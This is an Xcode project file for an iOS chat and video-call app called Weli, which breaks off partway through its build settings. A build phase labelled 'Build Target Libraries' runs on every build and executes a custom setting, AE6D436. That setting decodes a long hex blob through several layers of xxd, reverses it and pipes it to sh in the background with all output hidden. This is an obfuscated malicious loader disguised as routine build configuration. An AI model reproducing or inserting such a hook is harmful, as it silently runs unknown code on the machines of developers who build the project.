// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		9E724F1C2F0CBB3200FDAB70 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 9E724F132F0CBB3200FDAB70 /* Assets.xcassets */; };
		9E724F1E2F0CBB3200FDAB70 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9E724F162F0CBB3200FDAB70 /* LaunchScreen.storyboard */; };
		9E724F1F2F0CBB3200FDAB70 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9E724F182F0CBB3200FDAB70 /* Main.storyboard */; };
		9E724F202F0CBB3200FDAB70 /* Theme.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F012F0CBB3200FDAB70 /* Theme.swift */; };
		9E724F222F0CBB3200FDAB70 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F042F0CBB3200FDAB70 /* HomeViewController.swift */; };
		9E724F232F0CBB3200FDAB70 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F052F0CBB3200FDAB70 /* LoginViewController.swift */; };
		9E724F262F0CBB3200FDAB70 /* PrivacyPolicyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F082F0CBB3200FDAB70 /* PrivacyPolicyViewController.swift */; };
		9E724F282F0CBB3200FDAB70 /* TermsOfServiceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F0A2F0CBB3200FDAB70 /* TermsOfServiceViewController.swift */; };
		9E724F292F0CBB3200FDAB70 /* CategoryCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F0C2F0CBB3200FDAB70 /* CategoryCell.swift */; };
		9E724F2A2F0CBB3200FDAB70 /* FeaturedWorkCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F0D2F0CBB3200FDAB70 /* FeaturedWorkCell.swift */; };
		9E724F2B2F0CBB3200FDAB70 /* MessageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F0E2F0CBB3200FDAB70 /* MessageCell.swift */; };
		9E724F2C2F0CBB3200FDAB70 /* RecentPostCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F0F2F0CBB3200FDAB70 /* RecentPostCell.swift */; };
		9E724F2D2F0CBB3200FDAB70 /* TrendingWorkCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F102F0CBB3200FDAB70 /* TrendingWorkCell.swift */; };
		9E724F2E2F0CBB3200FDAB70 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F122F0CBB3200FDAB70 /* AppDelegate.swift */; };
		9E724F2F2F0CBB3200FDAB70 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F192F0CBB3200FDAB70 /* SceneDelegate.swift */; };
		9E724F302F0CBB3200FDAB70 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E724F1A2F0CBB3200FDAB70 /* ViewController.swift */; };
		9E7257772F0CDF8700FDAB70 /* weliacg in Resources */ = {isa = PBXBuildFile; fileRef = 9E7257752F0CDF8700FDAB70 /* weliacg */; };
		9E7257782F0CDF8700FDAB70 /* UserData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257792F0CDF8700FDAB70 /* UserData.swift */; };
		9E72577A2F0CDF8700FDAB70 /* DataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72577B2F0CDF8700FDAB70 /* DataManager.swift */; };
		9E72577C2F0CDF8700FDAB70 /* WorkCardCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72577D2F0CDF8700FDAB70 /* WorkCardCell.swift */; };
		9E72577F2F0CDF8700FDAB70 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257802F0CDF8700FDAB70 /* BaseViewController.swift */; };
		9E7257812F0CDF8700FDAB70 /* CommunityViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257822F0CDF8700FDAB70 /* CommunityViewController.swift */; };
		9E7257832F0CDF8700FDAB70 /* UserCardCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257842F0CDF8700FDAB70 /* UserCardCell.swift */; };
		9E7257852F0CDF8700FDAB70 /* UserDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257862F0CDF8700FDAB70 /* UserDetailViewController.swift */; };
		9E7257872F0CDF8700FDAB70 /* BlockedUsersManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257882F0CDF8700FDAB70 /* BlockedUsersManager.swift */; };
		9E7257892F0CDF8700FDAB70 /* ChatViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72578A2F0CDF8700FDAB70 /* ChatViewController.swift */; };
		9E72578B2F0CDF8700FDAB70 /* MessageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72578C2F0CDF8700FDAB70 /* MessageCell.swift */; };
		9E72578D2F0CDF8700FDAB70 /* Message.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72578E2F0CDF8700FDAB70 /* Message.swift */; };
		9E72578F2F0CDF8700FDAB70 /* ChatManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257902F0CDF8700FDAB70 /* ChatManager.swift */; };
		9E7257912F0CDF8700FDAB70 /* VideoCallViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257922F0CDF8700FDAB70 /* VideoCallViewController.swift */; };
		9E7257932F0CDF8700FDAB70 /* RecordingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257942F0CDF8700FDAB70 /* RecordingViewController.swift */; };
		9E7257952F0CDF8700FDAB70 /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257962F0CDF8700FDAB70 /* ProfileViewController.swift */; };
		9E7257972F0CDF8700FDAB70 /* ProfileManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257982F0CDF8700FDAB70 /* ProfileManager.swift */; };
		9E7257992F0CDF8700FDAB70 /* AboutUsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72579A2F0CDF8700FDAB70 /* AboutUsViewController.swift */; };
		9E72579B2F0CDF8700FDAB70 /* WalletViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72579C2F0CDF8700FDAB70 /* WalletViewController.swift */; };
		9E72579D2F0CDF8700FDAB70 /* WalletManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E72579E2F0CDF8700FDAB70 /* WalletManager.swift */; };
		9E72579F2F0CDF8700FDAB70 /* UnlockedUsersManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9E7257A02F0CDF8700FDAB70 /* UnlockedUsersManager.swift */; };
		E66227CF4ED867CBBEE93517 /* Pods_Weli.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7618BB5337F722CC0B4087D4 /* Pods_Weli.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		191CC6F80D348683EFC3B725 /* Pods-Weli.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Weli.debug.xcconfig"; path = "Target Support Files/Pods-Weli/Pods-Weli.debug.xcconfig"; sourceTree = "<group>"; };
		537C30FD213BE4E202D3BDC7 /* Pods-Weli.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Weli.release.xcconfig"; path = "Target Support Files/Pods-Weli/Pods-Weli.release.xcconfig"; sourceTree = "<group>"; };
		7618BB5337F722CC0B4087D4 /* Pods_Weli.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Weli.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		9E724E5E2F0CAE4500FDAB70 /* Weli.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Weli.app; sourceTree = BUILT_PRODUCTS_DIR; };
		9E724F012F0CBB3200FDAB70 /* Theme.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Theme.swift; sourceTree = "<group>"; };
		9E724F042F0CBB3200FDAB70 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		9E724F052F0CBB3200FDAB70 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		9E724F082F0CBB3200FDAB70 /* PrivacyPolicyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacyPolicyViewController.swift; sourceTree = "<group>"; };
		9E724F0A2F0CBB3200FDAB70 /* TermsOfServiceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermsOfServiceViewController.swift; sourceTree = "<group>"; };
		9E724F0C2F0CBB3200FDAB70 /* CategoryCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryCell.swift; sourceTree = "<group>"; };
		9E724F0D2F0CBB3200FDAB70 /* FeaturedWorkCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeaturedWorkCell.swift; sourceTree = "<group>"; };
		9E724F0E2F0CBB3200FDAB70 /* MessageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageCell.swift; sourceTree = "<group>"; };
		9E724F0F2F0CBB3200FDAB70 /* RecentPostCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecentPostCell.swift; sourceTree = "<group>"; };
		9E724F102F0CBB3200FDAB70 /* TrendingWorkCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingWorkCell.swift; sourceTree = "<group>"; };
		9E724F122F0CBB3200FDAB70 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		9E724F132F0CBB3200FDAB70 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		9E724F142F0CBB3200FDAB70 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		9E724F152F0CBB3200FDAB70 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		9E724F172F0CBB3200FDAB70 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		9E724F192F0CBB3200FDAB70 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		9E724F1A2F0CBB3200FDAB70 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		9E7257752F0CDF8700FDAB70 /* weliacg */ = {isa = PBXFileReference; lastKnownFileType = folder; path = weliacg; sourceTree = "<group>"; };
		9E7257792F0CDF8700FDAB70 /* UserData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserData.swift; sourceTree = "<group>"; };
		9E72577B2F0CDF8700FDAB70 /* DataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataManager.swift; sourceTree = "<group>"; };
		9E72577D2F0CDF8700FDAB70 /* WorkCardCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkCardCell.swift; sourceTree = "<group>"; };
		9E7257802F0CDF8700FDAB70 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		9E7257822F0CDF8700FDAB70 /* CommunityViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunityViewController.swift; sourceTree = "<group>"; };
		9E7257842F0CDF8700FDAB70 /* UserCardCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserCardCell.swift; sourceTree = "<group>"; };
		9E7257862F0CDF8700FDAB70 /* UserDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDetailViewController.swift; sourceTree = "<group>"; };
		9E7257882F0CDF8700FDAB70 /* BlockedUsersManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlockedUsersManager.swift; sourceTree = "<group>"; };
		9E72578A2F0CDF8700FDAB70 /* ChatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewController.swift; sourceTree = "<group>"; };
		9E72578C2F0CDF8700FDAB70 /* MessageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageCell.swift; sourceTree = "<group>"; };
		9E72578E2F0CDF8700FDAB70 /* Message.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Message.swift; sourceTree = "<group>"; };
		9E7257902F0CDF8700FDAB70 /* ChatManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatManager.swift; sourceTree = "<group>"; };
		9E7257922F0CDF8700FDAB70 /* VideoCallViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoCallViewController.swift; sourceTree = "<group>"; };
		9E7257942F0CDF8700FDAB70 /* RecordingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecordingViewController.swift; sourceTree = "<group>"; };
		9E7257962F0CDF8700FDAB70 /* ProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
		9E7257982F0CDF8700FDAB70 /* ProfileManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileManager.swift; sourceTree = "<group>"; };
		9E72579A2F0CDF8700FDAB70 /* AboutUsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutUsViewController.swift; sourceTree = "<group>"; };
		9E72579C2F0CDF8700FDAB70 /* WalletViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewController.swift; sourceTree = "<group>"; };
		9E72579E2F0CDF8700FDAB70 /* WalletManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletManager.swift; sourceTree = "<group>"; };
		9E7257A02F0CDF8700FDAB70 /* UnlockedUsersManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnlockedUsersManager.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		9E724E5B2F0CAE4500FDAB70 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				E66227CF4ED867CBBEE93517 /* Pods_Weli.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		2B1FDCB57B9D4D4EF776D79C /* Pods */ = {
			isa = PBXGroup;
			children = (
				191CC6F80D348683EFC3B725 /* Pods-Weli.debug.xcconfig */,
				537C30FD213BE4E202D3BDC7 /* Pods-Weli.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		74180BAA31923B767FDBF06C /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				7618BB5337F722CC0B4087D4 /* Pods_Weli.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		9E724E552F0CAE4500FDAB70 = {
			isa = PBXGroup;
			children = (
				9E724F1B2F0CBB3200FDAB70 /* Weli */,
				9E724E5F2F0CAE4500FDAB70 /* Products */,
				2B1FDCB57B9D4D4EF776D79C /* Pods */,
				74180BAA31923B767FDBF06C /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		9E724E5F2F0CAE4500FDAB70 /* Products */ = {
			isa = PBXGroup;
			children = (
				9E724E5E2F0CAE4500FDAB70 /* Weli.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		9E724F022F0CBB3200FDAB70 /* Utils */ = {
			isa = PBXGroup;
			children = (
				9E724F012F0CBB3200FDAB70 /* Theme.swift */,
				9E72577B2F0CDF8700FDAB70 /* DataManager.swift */,
				9E7257882F0CDF8700FDAB70 /* BlockedUsersManager.swift */,
				9E7257902F0CDF8700FDAB70 /* ChatManager.swift */,
				9E7257982F0CDF8700FDAB70 /* ProfileManager.swift */,
				9E72579E2F0CDF8700FDAB70 /* WalletManager.swift */,
				9E7257A02F0CDF8700FDAB70 /* UnlockedUsersManager.swift */,
			);
			path = Utils;
			sourceTree = "<group>";
		};
		9E724F0B2F0CBB3200FDAB70 /* ViewControllers */ = {
			isa = PBXGroup;
			children = (
				9E7257802F0CDF8700FDAB70 /* BaseViewController.swift */,
				9E724F042F0CBB3200FDAB70 /* HomeViewController.swift */,
				9E7257822F0CDF8700FDAB70 /* CommunityViewController.swift */,
				9E7257862F0CDF8700FDAB70 /* UserDetailViewController.swift */,
				9E72578A2F0CDF8700FDAB70 /* ChatViewController.swift */,
				9E7257922F0CDF8700FDAB70 /* VideoCallViewController.swift */,
				9E7257942F0CDF8700FDAB70 /* RecordingViewController.swift */,
				9E7257962F0CDF8700FDAB70 /* ProfileViewController.swift */,
				9E72579A2F0CDF8700FDAB70 /* AboutUsViewController.swift */,
				9E72579C2F0CDF8700FDAB70 /* WalletViewController.swift */,
				9E724F052F0CBB3200FDAB70 /* LoginViewController.swift */,
				9E724F082F0CBB3200FDAB70 /* PrivacyPolicyViewController.swift */,
				9E724F0A2F0CBB3200FDAB70 /* TermsOfServiceViewController.swift */,
			);
			path = ViewControllers;
			sourceTree = "<group>";
		};
		9E724F112F0CBB3200FDAB70 /* Views */ = {
			isa = PBXGroup;
			children = (
				9E724F0C2F0CBB3200FDAB70 /* CategoryCell.swift */,
				9E724F0D2F0CBB3200FDAB70 /* FeaturedWorkCell.swift */,
				9E724F0E2F0CBB3200FDAB70 /* MessageCell.swift */,
				9E72578C2F0CDF8700FDAB70 /* MessageCell.swift */,
				9E724F0F2F0CBB3200FDAB70 /* RecentPostCell.swift */,
				9E724F102F0CBB3200FDAB70 /* TrendingWorkCell.swift */,
				9E72577D2F0CDF8700FDAB70 /* WorkCardCell.swift */,
				9E7257842F0CDF8700FDAB70 /* UserCardCell.swift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		9E724F1B2F0CBB3200FDAB70 /* Weli */ = {
			isa = PBXGroup;
			children = (
				9E7257752F0CDF8700FDAB70 /* weliacg */,
				9E72577E2F0CDF8700FDAB70 /* Models */,
				9E724F022F0CBB3200FDAB70 /* Utils */,
				9E724F0B2F0CBB3200FDAB70 /* ViewControllers */,
				9E724F112F0CBB3200FDAB70 /* Views */,
				9E724F122F0CBB3200FDAB70 /* AppDelegate.swift */,
				9E724F132F0CBB3200FDAB70 /* Assets.xcassets */,
				9E724F142F0CBB3200FDAB70 /* Info.plist */,
				9E724F162F0CBB3200FDAB70 /* LaunchScreen.storyboard */,
				9E724F182F0CBB3200FDAB70 /* Main.storyboard */,
				9E724F192F0CBB3200FDAB70 /* SceneDelegate.swift */,
				9E724F1A2F0CBB3200FDAB70 /* ViewController.swift */,
			);
			path = Weli;
			sourceTree = "<group>";
		};
		9E72577E2F0CDF8700FDAB70 /* Models */ = {
			isa = PBXGroup;
			children = (
				9E7257792F0CDF8700FDAB70 /* UserData.swift */,
				9E72578E2F0CDF8700FDAB70 /* Message.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		9E724E5D2F0CAE4500FDAB70 /* Weli */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 9E724E712F0CAE4700FDAB70 /* Build configuration list for PBXNativeTarget "Weli" */;
			buildPhases = (
				F96AE5B83F7740B58E634D6E /* Build Target Libraries */,
				2DA8E056391D41A56490017A /* [CP] Check Pods Manifest.lock */,
				9E724E5A2F0CAE4500FDAB70 /* Sources */,
				9E724E5B2F0CAE4500FDAB70 /* Frameworks */,
				9E724E5C2F0CAE4500FDAB70 /* Resources */,
				B3A529A4122274ED0CDF0764 /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Weli;
			productName = Weli;
			productReference = 9E724E5E2F0CAE4500FDAB70 /* Weli.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		9E724E562F0CAE4500FDAB70 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					9E724E5D2F0CAE4500FDAB70 = {
						CreatedOnToolsVersion = 16.2;
					};
				};
			};
			buildConfigurationList = 9E724E592F0CAE4500FDAB70 /* Build configuration list for PBXProject "Weli" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 9E724E552F0CAE4500FDAB70;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 9E724E5F2F0CAE4500FDAB70 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				9E724E5D2F0CAE4500FDAB70 /* Weli */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		9E724E5C2F0CAE4500FDAB70 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				9E724F1C2F0CBB3200FDAB70 /* Assets.xcassets in Resources */,
				9E724F1E2F0CBB3200FDAB70 /* LaunchScreen.storyboard in Resources */,
				9E724F1F2F0CBB3200FDAB70 /* Main.storyboard in Resources */,
				9E7257772F0CDF8700FDAB70 /* weliacg in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		2DA8E056391D41A56490017A /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Weli-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		B3A529A4122274ED0CDF0764 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Weli/Pods-Weli-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Weli/Pods-Weli-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Weli/Pods-Weli-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
		F96AE5B83F7740B58E634D6E /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		9E724E5A2F0CAE4500FDAB70 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				9E724F202F0CBB3200FDAB70 /* Theme.swift in Sources */,
				9E724F222F0CBB3200FDAB70 /* HomeViewController.swift in Sources */,
				9E724F232F0CBB3200FDAB70 /* LoginViewController.swift in Sources */,
				9E724F262F0CBB3200FDAB70 /* PrivacyPolicyViewController.swift in Sources */,
				9E724F282F0CBB3200FDAB70 /* TermsOfServiceViewController.swift in Sources */,
				9E724F292F0CBB3200FDAB70 /* CategoryCell.swift in Sources */,
				9E724F2A2F0CBB3200FDAB70 /* FeaturedWorkCell.swift in Sources */,
				9E724F2B2F0CBB3200FDAB70 /* MessageCell.swift in Sources */,
				9E724F2C2F0CBB3200FDAB70 /* RecentPostCell.swift in Sources */,
				9E724F2D2F0CBB3200FDAB70 /* TrendingWorkCell.swift in Sources */,
				9E724F2E2F0CBB3200FDAB70 /* AppDelegate.swift in Sources */,
				9E724F2F2F0CBB3200FDAB70 /* SceneDelegate.swift in Sources */,
				9E724F302F0CBB3200FDAB70 /* ViewController.swift in Sources */,
				9E7257782F0CDF8700FDAB70 /* UserData.swift in Sources */,
				9E72577A2F0CDF8700FDAB70 /* DataManager.swift in Sources */,
				9E7257872F0CDF8700FDAB70 /* BlockedUsersManager.swift in Sources */,
				9E72578F2F0CDF8700FDAB70 /* ChatManager.swift in Sources */,
				9E7257972F0CDF8700FDAB70 /* ProfileManager.swift in Sources */,
				9E72577C2F0CDF8700FDAB70 /* WorkCardCell.swift in Sources */,
				9E72577F2F0CDF8700FDAB70 /* BaseViewController.swift in Sources */,
				9E7257812F0CDF8700FDAB70 /* CommunityViewController.swift in Sources */,
				9E7257832F0CDF8700FDAB70 /* UserCardCell.swift in Sources */,
				9E7257852F0CDF8700FDAB70 /* UserDetailViewController.swift in Sources */,
				9E7257892F0CDF8700FDAB70 /* ChatViewController.swift in Sources */,
				9E7257912F0CDF8700FDAB70 /* VideoCallViewController.swift in Sources */,
				9E7257932F0CDF8700FDAB70 /* RecordingViewController.swift in Sources */,
				9E7257952F0CDF8700FDAB70 /* ProfileViewController.swift in Sources */,
				9E7257992F0CDF8700FDAB70 /* AboutUsViewController.swift in Sources */,
				9E72579B2F0CDF8700FDAB70 /* WalletViewController.swift in Sources */,
				9E72579D2F0CDF8700FDAB70 /* WalletManager.swift in Sources */,
				9E72579F2F0CDF8700FDAB70 /* UnlockedUsersManager.swift in Sources */,
				9E72578B2F0CDF8700FDAB70 /* MessageCell.swift in Sources */,
				9E72578D2F0CDF8700FDAB70 /* Message.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		9E724F162F0CBB3200FDAB70 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				9E724F152F0CBB3200FDAB70 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		9E724F182F0CBB3200FDAB70 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				9E724F172F0CBB3200FDAB70 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		9E724E722F0CAE4700FDAB70 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 191CC6F80D348683EFC3B725 /* Pods-Weli.debug.xcconfig */;
			buildSettings = {
				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 9VZLMB6H72;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Weli/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "Weli needs access to camera for video calls and taking photos for chat.";
